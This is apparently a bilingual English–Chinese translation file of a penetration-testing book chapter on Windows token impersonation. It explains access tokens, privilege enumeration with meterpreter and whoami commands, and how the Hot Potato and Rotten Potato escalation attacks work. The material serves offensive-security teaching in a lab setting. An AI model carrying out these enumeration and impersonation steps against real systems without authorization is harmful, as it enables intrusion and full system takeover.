- en: '*Chapter 6*: Impersonation Attacks'
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: '*第六章*：冒充攻击'
- en: Now that you have got your hands dirty with the privilege escalation process
    on Windows, we can begin exploring other attack vectors that can be exploited
    to elevate our privileges. In this chapter, we will be taking a closer look at
    **Windows access tokens**, how they work, and how they can be leveraged to elevate
    our privileges through impersonation attacks.
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: 现在您已经在 Windows 上的权限提升过程中动手操作过，我们可以开始探索其他可以利用的攻击路径，以提升我们的权限。在本章中，我们将更详细地了解**Windows
    访问令牌**，它们是如何工作的，以及如何通过冒充攻击利用它们来提升我们的权限。
- en: The practical demonstrations in this chapter will primarily be focused on how
    to enumerate privileges on a system to determine whether it is vulnerable to impersonation
    attacks and how to generate or impersonate a privileged Windows access token that
    can be used to elevate our privileges.
  id: totrans-2
  prefs: []
  type: TYPE_NORMAL
  zh: 本章的实际演示将主要集中在如何枚举系统上的特权，以确定系统是否容易受到冒充攻击，以及如何生成或冒充一个特权的 Windows 访问令牌，该令牌可用于提升我们的特权。
- en: We will also look at how to use various built-in **meterpreter** modules to
    automate the token impersonation process on a target system.
  id: totrans-3
  prefs: []
  type: TYPE_NORMAL
  zh: 我们还将学习如何使用各种内置的**meterpreter**模块自动化目标系统上的令牌冒充过程。
- en: 'In this chapter, we''re going to cover the following main topics:'
  id: totrans-4
  prefs: []
  type: TYPE_NORMAL
  zh: 本章将涵盖以下主要主题：
- en: Understanding Windows access tokens
  id: totrans-5
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 了解 Windows 访问令牌
- en: Enumerating privileges
  id: totrans-6
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 枚举特权
- en: Token impersonation attacks
  id: totrans-7
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 令牌冒充攻击
- en: Escalating privileges via a Potato attack
  id: totrans-8
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 通过 Potato 攻击提升特权
- en: Technical requirements
  id: totrans-9
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 技术要求
- en: 'To follow along with the demonstrations in this chapter, you will need to ensure
    that you meet the following technical requirements:'
  id: totrans-10
  prefs: []
  type: TYPE_NORMAL
  zh: 要跟随本章中的演示，您需要确保满足以下技术要求：
- en: Familiarity with Windows CMD commands
  id: totrans-11
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 熟悉 Windows CMD 命令
- en: Basic understanding of Windows access tokens
  id: totrans-12
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 基本理解 Windows 访问令牌
- en: 'You can view this chapter''s code in action here: [https://bit.ly/3kWPSch](https://bit.ly/3kWPSch)'
  id: totrans-13
  prefs: []
  type: TYPE_NORMAL
  zh: 您可以在此处查看本章代码的实际演示：[https://bit.ly/3kWPSch](https://bit.ly/3kWPSch)
- en: Understanding Windows access tokens
  id: totrans-14
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 了解 Windows 访问令牌
- en: We took a brief look at how Windows access tokens work in the first chapter
    of the book and should have a general idea of how they can be abused to elevate
    privileges. This section will dive deeper into how they work and their role in
    the authentication process on Windows.
  id: totrans-15
  prefs: []
  type: TYPE_NORMAL
  zh: 我们在本书的第一章简要介绍了 Windows 访问令牌是如何工作的，并应该对它们如何被滥用来提升权限有一个大致的了解。本节将更深入地探讨它们是如何工作的，以及它们在
    Windows 身份验证过程中的作用。
- en: The first step is to revisit the function Windows access tokens play in authentication,
    how they work, and the various security levels that can be assigned to tokens.
  id: totrans-16
  prefs: []
  type: TYPE_NORMAL
  zh: 第一步是重新审视 Windows 访问令牌在身份验证中所起的作用，它们是如何工作的，以及可以分配给令牌的各种安全级别。
- en: Windows access tokens
  id: totrans-17
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: Windows 访问令牌
- en: Windows access tokens are a core element of the authentication process on Windows
    and are created and managed by the **Local Security Authority Subsystem Service**
    (**LSASS**).
  id: totrans-18
  prefs: []
  type: TYPE_NORMAL
  zh: Windows 访问令牌是 Windows 身份验证过程中的核心元素，由**本地安全授权子系统服务**（**LSASS**）创建和管理。
- en: A Windows access token is responsible for identifying and describing the security
    context of a process or thread running on a system. Simply put, an access token
    can be thought of as a temporary key akin to a web cookie that provides users
    with access to a system or network without having to provide credentials each
    time a process is started or a system resource is accessed.
  id: totrans-19
  prefs: []
  type: TYPE_NORMAL
  zh: Windows 访问令牌负责识别和描述在系统上运行的进程或线程的安全上下文。简单来说，访问令牌可以被看作是一个临时的密钥，类似于 Web Cookie，它为用户提供对系统或网络的访问，而无需每次启动进程或访问系统资源时都提供凭据。
- en: Access tokens are generated by the **winlogon.exe** process every time a user
    authenticates successfully and includes the identity and privileges of the user
    account associated with the thread or process. This token is then attached to
    the **userinit.exe** process, after which all child processes started by a user
    will inherit a copy of the access token from their creator and will run under
    the privileges of the same access token.
  id: totrans-20
  prefs: []
  type: TYPE_NORMAL
  zh: 访问令牌由**winlogon.exe**进程在每次用户成功身份验证时生成，并包含与线程或进程相关的用户帐户的身份和特权。然后，此令牌会附加到**userinit.exe**进程，之后由用户启动的所有子进程将继承来自其创建者的访问令牌副本，并在相同访问令牌的特权下运行。
- en: Token security levels
  id: totrans-21
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 令牌安全级别
- en: Given the fact that access tokens are used to provide specific access to users
    based on their privileges, Windows access tokens are categorized based on the
    varying security levels assigned to them. These security levels are used to determine
    the privileges that are assigned to a specific token.
  id: totrans-22
  prefs: []
  type: TYPE_NORMAL
  zh: 考虑到访问令牌用于根据用户的权限提供特定访问权限，Windows 访问令牌根据分配给它们的不同安全级别进行分类。这些安全级别用于确定分配给特定令牌的权限。
- en: 'An access token will typically be assigned one of the following security levels:'
  id: totrans-23
  prefs: []
  type: TYPE_NORMAL
  zh: 访问令牌通常会分配以下安全级别之一：
- en: Anonymous
  id: totrans-24
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 匿名
- en: Identify
  id: totrans-25
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 身份识别
- en: Impersonate
  id: totrans-26
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 伪造
- en: Delegate
  id: totrans-27
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 委托
- en: The two main security levels we will be encountering and leveraging are **impersonate**
    and **delegate** as they can be abused to elevate our privileges on a system.
  id: totrans-28
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将遇到并利用的两个主要安全级别是 **impersonate** 和 **delegate**，因为它们可以被滥用来提升我们在系统上的权限。
- en: Impersonate tokens
  id: totrans-29
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 伪造令牌
- en: '**Impersonate**-level tokens are created as a direct result of a non-interactive
    login on Windows, typically through specific system services or domain logons.'
  id: totrans-30
  prefs: []
  type: TYPE_NORMAL
  zh: '**Impersonate**-级别的令牌是 Windows 上非交互式登录的直接结果，通常是通过特定的系统服务或域登录生成的。'
- en: '**Impersonate**-level tokens can be used to impersonate a token on the local
    system and not on any external systems that utilize the token.'
  id: totrans-31
  prefs: []
  type: TYPE_NORMAL
  zh: '**Impersonate**-级别的令牌可用于在本地系统上伪造令牌，而不能用于任何使用该令牌的外部系统。'
- en: Delegate tokens
  id: totrans-32
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 委托令牌
- en: '**Delegate**-level tokens are typically created through an interactive login
    on Windows, primarily through a traditional login or through remote access protocols
    such as **Remote Desktop Protocol** (**RDP**).'
  id: totrans-33
  prefs: []
  type: TYPE_NORMAL
  zh: '**Delegate**-级别的令牌通常是通过在 Windows 上的交互式登录创建的，主要通过传统登录或通过远程访问协议如 **远程桌面协议**（**RDP**）生成。'
- en: '**Delegate**-level tokens pose the largest threat as they can be used to impersonate
    tokens on any system.'
  id: totrans-34
  prefs: []
  type: TYPE_NORMAL
  zh: '**Delegate**-级别的令牌构成最大威胁，因为它们可以在任何系统上用于伪造令牌。'
- en: Now that we have an idea of how access tokens work and the various security
    levels associated with them, we can look at how they are abused to elevate privileges
    on a system.
  id: totrans-35
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们了解了访问令牌的工作原理及其相关的各种安全级别，我们可以看看它们是如何被滥用来提升系统权限的。
- en: Abusing tokens
  id: totrans-36
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 滥用令牌
- en: The process of abusing tokens to elevate privileges on a system will primarily
    depend on the privileges assigned to the account that has been exploited to gain
    initial access.
  id: totrans-37
  prefs: []
  type: TYPE_NORMAL
  zh: 滥用令牌以提升系统权限的过程主要取决于被利用账户的权限，该账户已被用来获得初始访问权限。
- en: In order to fully understand how to leverage the delegate and impersonate access
    tokens to elevate our privileges, we will need to explore the specific Windows
    privileges that are required to perform an impersonation attack.
  id: totrans-38
  prefs: []
  type: TYPE_NORMAL
  zh: 为了充分理解如何利用委托和伪造访问令牌提升我们的权限，我们需要探讨执行伪造攻击所需的特定 Windows 权限。
- en: 'The following are the privileges that are required for a successful impersonation
    attack:'
  id: totrans-39
  prefs: []
  type: TYPE_NORMAL
  zh: 以下是成功进行伪造攻击所需的权限：
- en: '**SeAssignPrimaryToken**: This allows a user to impersonate tokens using exploit
    tools such as **rottenpotato.exe**.'
  id: totrans-40
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**SeAssignPrimaryToken**：允许用户使用如 **rottenpotato.exe** 等攻击工具伪造令牌。'
- en: '**SeCreateToken**: This allows a user to create an arbitrary token with administrative
    privileges.'
  id: totrans-41
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**SeCreateToken**：允许用户创建具有管理员权限的任意令牌。'
- en: '**SeImpersonatePrivilege**: This allows a user to create a process under the
    security context of another user typically with administrative privileges.'
  id: totrans-42
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**SeImpersonatePrivilege**：允许用户在通常具有管理员权限的情况下，在另一个用户的安全上下文下创建进程。'
- en: 'More information regarding the specific Windows privileges and their potential
    impact in terms of impersonation attacks can be found here: [https://github.com/gtworek/Priv2Admin.](https://github.com/gtworek/Priv2Admin)'
  id: totrans-43
  prefs: []
  type: TYPE_NORMAL
  zh: 更多关于特定 Windows 权限及其在伪造攻击中可能产生的影响的信息，请参考：[https://github.com/gtworek/Priv2Admin.](https://github.com/gtworek/Priv2Admin)
- en: Now that we understand how access tokens work on Windows, the various security
    levels associated with tokens, and the specific privileges required to launch
    a successful impersonation attack, we can begin the token impersonation process
    by taking a look at how to enumerate the privileges associated with our account
    on the target system.
  id: totrans-44
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们理解了 Windows 上访问令牌的工作原理、与令牌相关的各种安全级别以及成功发起伪造攻击所需的特定权限，我们可以通过查看如何枚举目标系统上与我们账户相关联的权限，来开始令牌伪造过程。
- en: In this chapter, we will be using Windows 7 SP1 virtual machine that we had
    set up in our virtual hacking lab.
  id: totrans-45
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们将使用我们在虚拟黑客实验室中设置的 Windows 7 SP1 虚拟机。
- en: We can now begin the process of enumerating privileges in order to determine
    whether we can perform an impersonation attack on the target.
  id: totrans-46
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们可以开始枚举特权的过程，以确定是否可以对目标执行伪造攻击。
- en: Enumerating privileges
  id: totrans-47
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 枚举特权
- en: 'To perform the privilege enumeration process, you will need to ensure that
    you have access to your target system either through a command shell or a **meterpreter**
    session. We will be taking a look at how to use various techniques that will apply
    to both methods of access. To begin the privilege enumeration process, follow
    the outlined procedures:'
  id: totrans-48
  prefs: []
  type: TYPE_NORMAL
  zh: 要执行特权枚举过程，你需要确保通过命令行或**meterpreter**会话访问目标系统。我们将查看适用于这两种访问方法的各种技术。要开始特权枚举过程，请按照以下步骤操作：
- en: 'The first step is to identify the user account you are currently utilizing.
    This can be done by running the following command in **meterpreter**:'
  id: totrans-49
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 第一步是识别当前使用的用户账户。可以通过在**meterpreter**中运行以下命令来完成：
- en: '**getuid**'
  id: totrans-50
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**getuid**'
- en: 'If you do not have access to the target via a **meterpreter** session, you
    can run the following command in the command shell:'
  id: totrans-51
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如果你无法通过**meterpreter**会话访问目标，可以在命令行中运行以下命令：
- en: '**whoami**'
  id: totrans-52
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**whoami**'
- en: 'As highlighted in the following screenshot, this will output the current user
    you are logged in as; in this case, we are logged in as a regular user:'
  id: totrans-53
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如下图所示，这将输出当前登录的用户；在这种情况下，我们以普通用户身份登录：
- en: '![Figure 6.1 – Enumerating current user'
  id: totrans-54
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图6.1 – 枚举当前用户'
- en: '](Images/B17389_06_001.jpg)'
  id: totrans-55
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_06_001.jpg)'
- en: Figure 6.1 – Enumerating current user
  id: totrans-56
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图6.1 – 枚举当前用户
- en: 'The next step involves enumerating the user privileges, this can be done by
    running the following command in **meterpreter**:'
  id: totrans-57
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 下一步是枚举用户特权，可以通过在**meterpreter**中运行以下命令来实现：
- en: '**getprivs**'
  id: totrans-58
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**getprivs**'
- en: 'Alternatively, if you are utilizing a command shell, you can run the following
    Windows command in the command prompt:'
  id: totrans-59
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 另外，如果你正在使用命令行，可以在命令提示符下运行以下Windows命令：
- en: '**whoami /priv**'
  id: totrans-60
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**whoami /priv**'
- en: 'This will output a list of privileges assigned to the user account. We are
    primarily interested in identifying the following privileges that can be abused:'
  id: totrans-61
  prefs: []
  type: TYPE_NORMAL
  zh: 这将输出分配给用户账户的特权列表。我们主要关注识别以下可能被滥用的特权：
- en: '**SeAssignPrimaryToken**: This allows a user to impersonate tokens using exploit
    tools such as **rottenpotato.exe**.'
  id: totrans-62
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**SeAssignPrimaryToken**：此权限允许用户使用**rottenpotato.exe**等利用工具伪造令牌。'
- en: '**SeCreateToken**: This allows a user to create an arbitrary token with administrative
    privileges.'
  id: totrans-63
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**SeCreateToken**：此权限允许用户创建一个具有管理员权限的任意令牌。'
- en: '**SeImpersonatePrivilege**: This allows a user to create a process under the
    security context of another user typically with administrative privileges:'
  id: totrans-64
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**SeImpersonatePrivilege**：此权限允许用户在另一个用户的安全上下文中创建进程，通常该用户具有管理员权限：'
- en: '![Figure 6.2 – Enumerating privileges with meterpreter'
  id: totrans-65
  prefs: []
  type: TYPE_NORMAL
  zh: '![图6.2 – 使用meterpreter枚举特权'
- en: '](Images/B17389_06_002.jpg)'
  id: totrans-66
  prefs: []
  type: TYPE_NORMAL
  zh: '](Images/B17389_06_002.jpg)'
- en: Figure 6.2 – Enumerating privileges with meterpreter
  id: totrans-67
  prefs: []
  type: TYPE_NORMAL
  zh: 图6.2 – 使用meterpreter枚举特权
- en: 'As highlighted in the preceding screenshot, we are able to identify the **SeImpersonatePrivilege**
    privilege. This privilege can be used to create a process under the security context
    of another user typically with administrative privileges:'
  id: totrans-68
  prefs: []
  type: TYPE_NORMAL
  zh: 如前面的截图所示，我们能够识别出**SeImpersonatePrivilege**特权。此特权可以用来在另一个用户的安全上下文中创建进程，通常该用户具有管理员权限：
- en: '![Figure 6.3 – Enumerating privileges CMD'
  id: totrans-69
  prefs: []
  type: TYPE_NORMAL
  zh: '![图6.3 – 枚举特权 CMD'
- en: '](Images/B17389_06_003.jpg)'
  id: totrans-70
  prefs: []
  type: TYPE_NORMAL
  zh: '](Images/B17389_06_003.jpg)'
- en: Figure 6.3 – Enumerating privileges CMD
  id: totrans-71
  prefs: []
  type: TYPE_NORMAL
  zh: 图6.3 – 枚举特权 CMD
- en: As highlighted in the preceding screenshot, the Windows command will also provide
    information regarding the privilege; in this case, the **SeImpersonatePrivilege**
    privilege allows us to impersonate a client after authentication.
  id: totrans-72
  prefs: []
  type: TYPE_NORMAL
  zh: 如前面的截图所示，Windows命令也会提供有关特权的信息；在这种情况下，**SeImpersonatePrivilege**特权允许我们在身份验证后伪造客户端。
- en: If the account does not have any of the privileges outlined here, you will not
    be able to perform an impersonation attack successfully. As a result, you will
    need to identify another potential attack vector.
  id: totrans-73
  prefs: []
  type: TYPE_NORMAL
  zh: 如果账户没有上述列出的任何特权，你将无法成功执行伪造攻击。因此，你需要识别另一个潜在的攻击向量。
- en: We have now been able to successfully enumerate the privileges of the user account
    we are logged in as and can begin performing the token impersonation attack.
  id: totrans-74
  prefs: []
  type: TYPE_NORMAL
  zh: 我们现在已经能够成功枚举登录用户账户的特权，并可以开始执行令牌伪造攻击。
- en: Token impersonation attacks
  id: totrans-75
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 令牌伪造攻击
- en: Token impersonation attacks leverage specific Windows privileges such as **SeImpersonatePrivilege**
    to obtain an access token with administrative privileges that we can use to impersonate
    in order to elevate our privileges.
  id: totrans-76
  prefs: []
  type: TYPE_NORMAL
  zh: 令牌冒充攻击利用特定的 Windows 权限，如 **SeImpersonatePrivilege**，来获取具有管理权限的访问令牌，利用该令牌进行冒充，从而提升权限。
- en: This process will depend on the version of Windows you are targeting and can
    be performed through various techniques.
  id: totrans-77
  prefs: []
  type: TYPE_NORMAL
  zh: 这个过程将取决于你所针对的 Windows 版本，并且可以通过多种技术执行。
- en: The technique we will be focusing on is known as the **Potato attack**. This
    attack has some variations that alter the exploitation process; however, the core
    principles of the exploitation process remain the same. To fully understand how
    to successfully impersonate tokens, we will need to take a closer look at how
    the Potato attack works.
  id: totrans-78
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将重点讨论的技术被称为 **Potato 攻击**。这种攻击有一些变种，会改变利用过程，但利用过程的核心原则保持不变。为了充分理解如何成功冒充令牌，我们需要更深入地了解
    Potato 攻击的工作原理。
- en: Potato attacks overview
  id: totrans-79
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: Potato 攻击概述
- en: The Potato attack is the name given to a Windows privilege escalation technique
    that exploits known issues in Windows such as the *NTLM relay* (specifically the
    HTTP – SMB relay), **NetBIOS Name Service** (**NBNS**) *spoofing*, *WPAD*, and
    *Windows Update*.
  id: totrans-80
  prefs: []
  type: TYPE_NORMAL
  zh: Potato 攻击是一个 Windows 提权技术的名称，它利用 Windows 中已知的问题，如 *NTLM 中继*（特别是 HTTP - SMB 中继）、**NetBIOS
    名称服务**（**NBNS**）*欺骗*、*WPAD* 和 *Windows 更新*。
- en: This technique allows attackers to elevate privileges on a Windows system from
    an account with the lowest privileges to an account with the highest privilege
    available, namely **NT AUTHORITY**/**SYSTEM**.
  id: totrans-81
  prefs: []
  type: TYPE_NORMAL
  zh: 这种技术允许攻击者将 Windows 系统中的权限从最低权限账户提升到最高权限账户，即 **NT AUTHORITY**/**SYSTEM**。
- en: Because the exploitation process involves leveraging NTLM authentication, we
    need to get an understanding of how NTLM authentication works.
  id: totrans-82
  prefs: []
  type: TYPE_NORMAL
  zh: 因为利用 NTLM 身份验证的过程涉及到 NTLM 身份验证的工作原理，所以我们需要了解 NTLM 身份验证的基本原理。
- en: NTLM authentication
  id: totrans-83
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: NTLM 身份验证
- en: '**NT LAN Manager** (**NTLM**) is a collection of authentication protocols utilized
    in Windows to facilitate authentication between computers. The authentication
    process involves the use of a valid username and password to authenticate successfully.'
  id: totrans-84
  prefs: []
  type: TYPE_NORMAL
  zh: '**NT LAN 管理器**（**NTLM**）是一组在 Windows 中使用的身份验证协议，用于促进计算机之间的身份验证。身份验证过程涉及使用有效的用户名和密码来成功进行身份验证。'
- en: NTLM authentication operates under the client-server model of communication
    and involves a handshake process similar to the **TCP 3-way handshake**.
  id: totrans-85
  prefs: []
  type: TYPE_NORMAL
  zh: NTLM 身份验证在客户端-服务器通信模型下运行，并涉及一个类似于 **TCP 三次握手** 的握手过程。
- en: 'The authentication process utilizes three types of messages that are used to
    establish successful authentication:'
  id: totrans-86
  prefs: []
  type: TYPE_NORMAL
  zh: 身份验证过程利用三种类型的消息，这些消息用于建立成功的身份验证：
- en: Negotiation
  id: totrans-87
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 谈判
- en: Challenge
  id: totrans-88
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 挑战
- en: Response
  id: totrans-89
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 响应
- en: 'The following figure illustrates the NTLM authentication process as a whole
    and the handshake process between the client and the server:'
  id: totrans-90
  prefs: []
  type: TYPE_NORMAL
  zh: 以下图示展示了 NTLM 身份验证过程的整体情况，以及客户端与服务器之间的握手过程：
- en: '![Figure 6.4 – NTLM authentication process'
  id: totrans-91
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 6.4 – NTLM 身份验证过程'
- en: '](Images/B17389_06_004.jpg)'
  id: totrans-92
  prefs: []
  type: TYPE_NORMAL
  zh: '](Images/B17389_06_004.jpg)'
- en: Figure 6.4 – NTLM authentication process
  id: totrans-93
  prefs: []
  type: TYPE_NORMAL
  zh: 图 6.4 – NTLM 身份验证过程
- en: 'Now that we have a basic idea of how NTLM authentication works, let''s explore
    the steps involved in the handshake process in greater detail:'
  id: totrans-94
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们对 NTLM 身份验证的基本原理有了初步了解，接下来我们将更详细地探讨握手过程中的步骤：
- en: The client initiates the connection by sending an authentication request to
    the server; the authentication request includes a username for authentication.
  id: totrans-95
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 客户端通过向服务器发送身份验证请求来发起连接；该请求包括用于身份验证的用户名。
- en: The server responds to the request with an NTLM challenge, typically a random
    number.
  id: totrans-96
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 服务器回应请求，发送 NTLM 挑战，通常是一个随机数。
- en: The client receives the challenge response and generates a hash of the challenge
    number and the user's password and sends it back to the server.
  id: totrans-97
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 客户端接收到挑战响应后，生成挑战号码和用户密码的哈希值，并将其发送回服务器。
- en: The server already knows the user's password and generates a hash of the password
    to compare it to the hash that was sent back by the client.
  id: totrans-98
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 服务器已经知道用户的密码，并生成密码的哈希值来与客户端返回的哈希值进行比较。
- en: If the hashes match, the authenticity of the client and consequently the user
    is verified and access is granted; if there is a mismatch, access will be denied.
  id: totrans-99
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 如果哈希匹配，客户端的身份和用户的身份就会得到验证，且访问会被授权；如果不匹配，访问将被拒绝。
- en: The nature of the NTLM authentication handshake makes it vulnerable to **man-in-the-middle
    attacks**, which can be used to perform impersonation attacks.
  id: totrans-100
  prefs: []
  type: TYPE_NORMAL
  zh: NTLM 身份验证握手的性质使其容易受到 **中间人攻击**，可以利用这些攻击进行伪装攻击。
- en: You should now have an understanding of how NTLM authentication works, and we
    can now explore the various variations of the Potato attack that can be used.
  id: totrans-101
  prefs: []
  type: TYPE_NORMAL
  zh: 你现在应该理解 NTLM 身份验证的工作原理，接下来我们可以探索各种可以使用的土豆攻击变种。
- en: Hot Potato attack
  id: totrans-102
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 热土豆攻击
- en: 'The Hot Potato attack involves various steps that leverage the NTLM relay (specifically
    the HTTP=>SMB relay), WPAD, NetBIOS name server, spoofing, and Windows Update.
    The attack works as follows:'
  id: totrans-103
  prefs: []
  type: TYPE_NORMAL
  zh: 热土豆攻击涉及多个步骤，利用了 NTLM 中继（特别是 HTTP=>SMB 中继）、WPAD、NetBIOS 名称服务器、伪造和 Windows 更新。攻击过程如下：
- en: The first step involves flooding the target with fake NBNS response packets
    for our fake WPAD proxy server that we will set up on **127.0.0.1:80**. This will
    redirect HTTP traffic on the target system to our server.
  id: totrans-104
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 第一步是向目标发送伪造的 NBNS 响应包，指向我们将在 **127.0.0.1:80** 上设置的伪造 WPAD 代理服务器。这将把目标系统上的 HTTP
    流量重定向到我们的服务器。
- en: The next step involves starting Windows Update as **NT AUTHORITY**/**SYSTEM**.
  id: totrans-105
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 下一步是以 **NT AUTHORITY**/**SYSTEM** 启动 Windows 更新。
- en: By default, Windows Update will automatically find the network proxy setting
    configuration by requesting the URL **http://wpad/wpad.dat&#8221**. This is where
    the fake WPAD proxy server comes in place. If a proxy exists, it will be used.
    Given that we have flooded our target with packets containing the address of our
    fake proxy, Windows Update will use the fake proxy, therefore allowing us to intercept
    the privileged NTLM authentication requests.
  id: totrans-106
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 默认情况下，Windows 更新将通过请求 URL **http://wpad/wpad.dat&#8221** 自动查找网络代理设置配置。这时，伪造的
    WPAD 代理服务器就发挥作用了。如果存在代理，将会使用它。由于我们已经用包含伪造代理地址的包淹没了目标，Windows 更新将使用伪造代理，从而让我们拦截特权的
    NTLM 身份验证请求。
- en: The fake WPAD proxy authenticates via the NTLM SMB relay and obtains the NTLM
    security challenge. The security challenge is then forwarded to Windows Update.
  id: totrans-107
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 伪造的 WPAD 代理通过 NTLM SMB 中继进行身份验证，并获取 NTLM 安全挑战。然后将安全挑战转发给 Windows 更新。
- en: Windows Update sends back the NTLM response, which will be intercepted by the
    fake WPAD proxy.
  id: totrans-108
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: Windows 更新返回 NTLM 响应，该响应将被伪造的 WPAD 代理拦截。
- en: The final step involves using the NTLM response for authentication via SMB.
  id: totrans-109
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 最后一步是使用 NTLM 响应通过 SMB 进行身份验证。
- en: 'More information regarding the Hot Potato attack can be found here: [https://foxglovesecurity.com/2016/01/16/hot-potato/](https://foxglovesecurity.com/2016/01/16/hot-potato/)'
  id: totrans-110
  prefs: []
  type: TYPE_NORMAL
  zh: 关于热土豆攻击的更多信息可以在这里找到：[https://foxglovesecurity.com/2016/01/16/hot-potato/](https://foxglovesecurity.com/2016/01/16/hot-potato/)
- en: Rotten Potato attack
  id: totrans-111
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 腐烂土豆攻击
- en: 'The Rotten Potato attack involves three main steps that leverage the NTLM relay
    to negotiate a security token for **NT AUTHORITY**/**SYSTEM**. The attack works
    as follows:'
  id: totrans-112
  prefs: []
  type: TYPE_NORMAL
  zh: 腐烂土豆攻击涉及三个主要步骤，利用 NTLM 中继来协商 **NT AUTHORITY**/**SYSTEM** 的安全令牌。攻击过程如下：
- en: The first step involves tricking an **NT AUTHORITY**/**SYSTEM** account into
    authenticating via NTLM using a TCP endpoint that we operate.
  id: totrans-113
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 第一步是诱使 **NT AUTHORITY**/**SYSTEM** 账户通过我们操作的 TCP 端点使用 NTLM 进行身份验证。
- en: The authentication process can be facilitated by setting up a man-in-the-middle
    attack to locally negotiate a security token from an **NT AUTHORITY**/**SYSTEM**
    account.
  id: totrans-114
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 通过设置中间人攻击，可以促进身份验证过程，从 **NT AUTHORITY**/**SYSTEM** 账户本地协商安全令牌。
- en: The final step involves impersonating the token we have just negotiated. This
    requires our account to have the **SeImpersonatePrivilege** privilege.
  id: totrans-115
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 最后一步涉及伪装我们刚刚协商的令牌。这要求我们的账户拥有 **SeImpersonatePrivilege** 权限。
- en: The Rotten Potato attack is an improved variation of the Hot Potato attack,
    which also leverages the NTLM relay, NBNS spoofing, WPAD, and Windows Update.
    The Rotten Potato attack is much more efficient and provides a greater degree
    of success as it does not rely on the Windows Update process.
  id: totrans-116
  prefs: []
  type: TYPE_NORMAL
  zh: 腐烂土豆攻击是热土豆攻击的改进版本，也利用了 NTLM 中继、NBNS 伪造、WPAD 和 Windows 更新。腐烂土豆攻击更高效，成功率更高，因为它不依赖于
    Windows 更新过程。
- en: 'More information regarding the Rotten Potato attack can be found here: [https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/.](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)'
  id: totrans-117
  prefs: []
  type: TYPE_NORMAL
  zh: 更多关于 Rotten Potato 攻击的信息可以在此找到：[https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/.](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)
- en: Now that we understand how the various Potato attacks work, we can begin the
    token impersonation process on our target system.
  id: totrans-118
  prefs: []
